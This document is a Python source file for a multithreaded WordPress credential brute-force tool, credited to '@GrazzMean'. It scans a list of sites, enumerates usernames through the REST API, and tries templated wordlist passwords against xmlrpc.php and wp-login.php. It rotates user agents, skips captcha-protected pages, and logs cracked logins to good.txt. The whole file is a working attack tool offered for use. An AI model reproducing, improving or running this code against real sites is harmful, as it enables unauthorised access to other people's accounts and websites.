"""
XML-RPC && WP-Login Brute Force Use Custom SSL
This free tools created by t.me/@GrazzMean | https://github.com/fooster1337
edit as much as you like but don't forget to give credit.
if there are any bugs or inaccuracies dm me on telegram
"""

import requests
import socket
import os
import random
import re
import time
import sys
import concurrent.futures
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
from colorama import Fore, init
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
init()

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
yellow = Fore.YELLOW
blue = Fore.BLUE

banner = f"""{green}  
  _                _        
 | |              | |       
 | |__  _ __ _   _| |_ ___  
 | '_ \| '__| | | | __/ _ \ 
 | |_) | |  | |_| | ||  __/ 
 |_.__/|_|   \__,_|\__\___| 
{reset}                            
{yellow}XML-RPC{reset} |{yellow} WP-LOGIN BRUTE FORCE{reset}
By @GrazzMean                          
"""

thread = 10

password = open("top-830_MCR.txt", "r").read()

class Brute:
    def __init__(self, url):
        self.url = url
        self.thread = thread
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Accept-Language": "en-US,en;q=0.5"
        }
        self.cert = ("Files/cert.pem", "Files/key.pem")
        self.xmlrpc = 0
        self.wplogin = 0
        self.error_site = 0
        self.good = 0
        self.password = password
        self.keyword = {
            "[UPPERLOGIN]": "",
            "[WPLOGIN]": "",
            "[DOMAIN]": "",
            "[UPPERDOMAIN]": "",
            "[FULLDOMAIN]": ""
        }
        self.xmlrpc_lean = False
        self.wplogin_lean = False
        self.sessions = requests.Session()

    def vuln(self, msg):
        print(f"[{green}#{reset}] {self.url} => {green}{msg}{reset}")

    def failed(self, msg):
        print(f"[{red}#{reset}] {self.url} => {red}{msg}{reset}")

    def searchUsername(self):
        try:
            req = requests.get(self.url+"/wp-json/wp/v2/users", headers=self.headers, timeout=10, verify=False).text
            if "slug" in req:
                username = re.findall('"slug":"(.*?)"', req)
                if username:
                    return username
                self.failed("Cannot_Grab_Username")
                return []
            else:
                self.failed("No_Username")
                return []
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)
    
    def setPassword(self, username: str) -> list:
       
        pw = self.password
        self.keyword["[UPPERLOGIN]"] = username.upper()
        self.keyword["[WPLOGIN]"] = username 
        self.keyword["[DOMAIN]"] = urlparse(self.url).netloc
        self.keyword["[UPPERDOMAIN]"] = self.url.upper()
        self.keyword["[FULLDOMAIN]"] = self.url
        for key, value in self.keyword.items():
            pw = pw.replace(key, value)
                
           

        return pw.splitlines()
    
    def isVulnXmlrpc(self):
        self.headers["User-Agent"] = random_user_agent()
        try:
            req = requests.get(self.url+"/xmlrpc.php", headers=self.headers, timeout=10, verify=False).text
            if "XML-RPC server accepts POST requests only." in req:
                headers = {
                    "Content-Type": "text/xml",
                    "User-Agent": random_user_agent()
                }
                payload = """<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"""
                post = requests.post(self.url+"/xmlrpc.php", headers=headers, timeout=5, verify=False, data=payload).text
                if "wp.getUsersBlogs" in post:
                    self.vuln("Vuln_Xmlrpc")
                    self.xmlrpc += 1
                    return True
            self.failed("Xmlrpc")
            return False
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)

    def isVulnWpLogin(self):
        self.headers["User-Agent"] = random_user_agent()
        try:
            req = requests.get(self.url+"/wp-login.php", headers=self.headers, timeout=10, verify=False).text
            if "user_login" in req and "captcha" not in req:
                self.vuln("WpLogin")
                self.wplogin += 1
                return True
            self.failed("WpLogin_Not_Vuln")
            return False
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)
        
    def bruteXmlrpc(self, username: str, password: list) -> bool:
        headers = {
            "User-Agent": random_user_agent(),
            "Content-Type": "text/xml"
        }
        try:
            for password in password:
                payload = f"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password.encode('utf-8')}</value></param></params></methodCall>"""
                req = requests.post(self.url+"/xmlrpc.php", headers=headers, cert=self.cert, verify=False, timeout=10, data=payload.encode('utf8')).text
                if "<member><name>isAdmin</name><value>" in req:
                    print(f"[{yellow}XMLRPC{reset}] {self.url} => {green}{username}|{password}{reset}")
                    self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
                    return True
                else:
                    print(f"[{yellow}XMLRPC{reset}] {self.url} => {red}{username}|{password}{reset}")
        except requests.exceptions.Timeout:
            self.failed("Timeout")
            time.sleep(3)
        except Exception as e:
            self.failed(e)
            time.sleep(3)

    
    def isWordpress(self):
        self.headers["User-Agent"] = random_user_agent()
        try:
            req = requests.get(self.url, headers=self.headers, timeout=10, verify=False)
            if "/wp-content/themes/" in req.text:
                self.vuln("Wordpress")
                return True
            self.failed("Not_Wordpress")
            return False
        except requests.exceptions.Timeout:
            self.failed("Timeout")
        except Exception as e:
            self.failed(e)

    def save_content(self, files, content):
        open(files, "a+", encoding="utf8").write(content+"\n")

    def bruteWpLogin(self, username: str, password: list) -> bool:
        headers = {
            "User-Agent": random_user_agent(),
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        try:
            for password in password:
                data = {"log":username, "pwd":password.encode('utf8'), "wp-submit":"Log-In", "redirect_to":f"{self.url}/wp-admin/", "testcookie":"1"}
                req = self.sessions.post(self.url+"/wp-login.php", headers=headers, data=data, verify=False)
                if "/wp-admin/admin-ajax.php" in req or "dashboard" in req:
                    print(f"[{blue}WPLOGIN{reset}] {self.url} => {green}{username}|{password}{reset}")
                    self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
                    return True
                else:
                    print(f"[{blue}WPLOGIN{reset}] {self.url} => {red}{username}|{password}{reset}")
        except requests.exceptions.Timeout:
            self.failed("TIMEOUT")
        except Exception as e:
            self.failed(e)

    def GetCookies(self) -> bool:
        try:
            cooki = self.sessions.get(self.url, allow_redirects=False, headers=self.headers)
            return True
        except:
            return False
        
    def start(self):
        if not self.isWordpress():
            pass
        
        if self.isVulnXmlrpc():
            self.xmlrpc_lean = True
        if self.isVulnWpLogin():
            if self.GetCookies():
                self.wplogin_lean = True

        if self.xmlrpc_lean or self.wplogin_lean:
            self.save_content("wordpress.txt", self.url)
            username = self.searchUsername()
            if not username:
                return
            
            futures = []
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread) as executor:
                for user in username:
                    password = self.setPassword(user)
                    if self.xmlrpc_lean:
                        futures.append(executor.submit(self.bruteXmlrpc, user, password))
                    if self.wplogin_lean:
                        futures.append(executor.submit(self.bruteWpLogin, user, password))
                    
                    if not futures:
                        break

                    concurrent.futures.wait(futures)

                    result = [future.result() for future in futures]
                    if result:
                        break                

def create_socket(host: str, port: str) -> bool:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        res = s.connect_ex((host, port))
        if res != 0:
            return False
        return True
    except:
        return False
    finally:
        s.close()

def checkPort(host: str):
    scheme = "null"
    url = urlparse("http://"+host).netloc
    try:
        res = create_socket(url, 443)
        if not res:
            res = create_socket(url, 80)
            if res:
                scheme = "http"
        else:
            scheme = "https"
        
        return scheme
    
    except Exception as e:
        return scheme

def parseURL(url: str) -> str:
    url = url.replace('http://', '').replace('https://', '')
    scheme = checkPort(url)
    if scheme == "null":
        return
    url = scheme+"://"+url
    clean = urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path
    return clean.rstrip('/')

def startBrute(url):
    uri = parseURL(url)
    # if uri != None:
    #     if uri.endswith("/"):
    #         uri = uri.rstrip("/")
    #     Brute(uri).start()
    # else:
    #     print(f"[{red}#{reset}] {url} => {red}Die Website{reset}")
    if not uri:
        print(f"[{red}#{reset}] {url} => {red}Die Website{reset}")
        return
    Brute(uri).start()


def random_user_agent() -> str:
    useragent = []
    try:
        if not useragent:
            f = open("Files/user-agent.txt", "r").read().splitlines()
            useragent.extend(f)
        return random.choice(useragent)
    except:
        return "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"

def clear():
    os.system("cls") if os.name == "nt" else os.system("clear")

def createDirectory():
    if not os.path.exists("result_brute"):
        os.makedirs("result_brute")

def main():
    global thread
    try:
        print(banner)
        l = list(dict.fromkeys(open(input("- List : ")).read().splitlines()))
        thread = int(input("- Thread : "))
        pool = Pool(thread)
        pool.map(startBrute, l)
        pool.close(); pool.join()
    except Exception as e:
        print(e)

if __name__ == '__main__':
    try:
        createDirectory()
        clear()
        main()
    except KeyboardInterrupt:
        sys.exit(1)
    #Brute('http://kontol.com').start()
    
